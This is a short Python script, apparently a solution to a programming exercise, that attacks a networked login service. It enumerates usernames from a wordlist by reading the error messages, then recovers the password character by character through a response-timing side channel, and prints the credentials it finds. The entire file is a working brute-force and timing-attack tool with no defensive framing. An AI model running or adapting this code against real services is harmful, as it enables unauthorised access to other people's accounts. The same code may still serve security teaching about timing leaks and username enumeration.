import json
import socket
import sys
import time
from string import ascii_letters, digits

ip_address, port = sys.argv[1], int(sys.argv[2])
char_base = ascii_letters + digits


def hack_login(client, login_file):
    for x_user in login_file:
        json_string = {"login": x_user, "password": " "}
        message_text = json.dumps(json_string, indent=4)
        client.send(message_text.encode())
        socket_response = json.loads(client.recv(1024).decode())
        if socket_response['result'] == 'Wrong login!':
            continue
        elif socket_response['result'] in [
            'Wrong password!',
            'Exception happened during login'
        ]:
            return x_user


def hack_password(client, base, start_password=''):
    for char in base:
        msg = json.dumps({"login": login, "password": start_password+char})
        client.send(msg.encode())
        start = time.perf_counter()
        cli_response = json.loads(client.recv(1024).decode())
        if cli_response['result'] == 'Wrong password!':
            end = time.perf_counter()
            total_time = end - start
            if total_time < 0.1:
                continue
            return hack_password(client, base, start_password + char)
        elif cli_response['result'] == 'Connection success!':
            res = start_password + char
            return res


if __name__ == '__main__':

    with socket.socket() as client_socket, \
            open('logins.txt', 'r') as login_file:
        client_socket.connect((ip_address, port))
        logins = login_file.read().splitlines()

        login = hack_login(client_socket, logins)
        password = hack_password(client_socket, char_base)
        
        print(json.dumps({"login": login, "password": password}, indent=4))
